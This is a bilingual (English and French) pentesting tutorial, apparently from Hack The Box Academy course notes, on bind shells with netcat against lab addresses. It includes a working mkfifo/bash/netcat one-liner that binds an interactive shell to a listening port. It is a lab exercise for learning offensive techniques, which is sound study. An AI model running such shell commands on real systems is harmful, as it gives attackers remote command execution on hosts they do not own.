# Bind Shells

***

### <mark style="color:red;">What Is It?</mark>

With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).

**Bind Example**

![image](https://academy.hackthebox.com/storage/modules/115/bindshell.png)

Comme montré dans l'image, on se connecterait directement à l'adresse IP et au port écoutant sur la cible. Cependant, plusieurs défis peuvent se poser pour obtenir un accès shell de cette manière. Voici quelques éléments à prendre en compte :

1. Il faudrait qu'un "listener" (écouteur) soit déjà démarré sur la cible.
2. Si aucun "listener" n'est démarré, il faudrait trouver un moyen d'en démarrer un.
3. Les administrateurs configurent généralement des règles strictes de pare-feu entrant et de NAT (avec PAT) sur les bords du réseau (exposé publiquement), donc il faudrait déjà être sur le réseau interne.
4. Les pare-feu des systèmes d'exploitation (Windows et Linux) bloquent souvent la plupart des connexions entrantes qui ne sont pas associées à des applications de réseau de confiance.

***

### <mark style="color:red;">Practicing with GNU Netcat</mark>

<mark style="color:orange;">**No. 1: Server - Target starting Netcat listener**</mark>

```shell-session
Target@server:~$ nc -lvnp 7777
```

In this instance, the target will be our server, and the attack box will be our client. Once we hit enter, the listener is started and awaiting a connection from the client.

Back on the client (attack box), we will use nc to connect to the listener we started on the server.

<mark style="color:orange;">**No. 2: Client - Attack box connecting to target**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

Notice how we are using nc on the client and the server. On the client-side, we specify the server's IP address and the port that we configured to listen on (`7777`). Once we successfully connect, we can see a `succeeded!` message on the client as shown above and a `received!` message on the server, as seen below.

<mark style="color:orange;">**No. 3: Server - Target receiving connection from client**</mark>

```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!    
```

Know that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.

<mark style="color:orange;">**No. 4: Client - Attack box sending message Hello Academy**</mark>

```bash
mrroboteLiot@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy  
```

Once we type the message and hit enter, we will notice the message is received on the server-side.

<mark style="color:orange;">**No. 5: Server - Target receiving Hello Academy message**</mark>

```shell-session
Victim@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy 
```

### <mark style="color:red;">Establishing a Basic Bind Shell with Netcat</mark>

<mark style="color:orange;">**No. 1: Server - Binding a Bash shell to the TCP session**</mark>

{% code fullWidth="true" %}
```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
{% endcode %}

{% hint style="info" %}
**C’est une boucle dans le sens où :**

* La machine cible attend des commandes via le tube nommé `/tmp/f` (reçu via Netcat).
* Dès que l'attaquant envoie des commandes, celles-ci passent dans le tube, sont exécutées par Bash, et les résultats sont envoyés de retour à l'attaquant.
* L'attaquant peut continuer à envoyer des commandes, et tant que la connexion est active, cette communication continue.
{% endhint %}
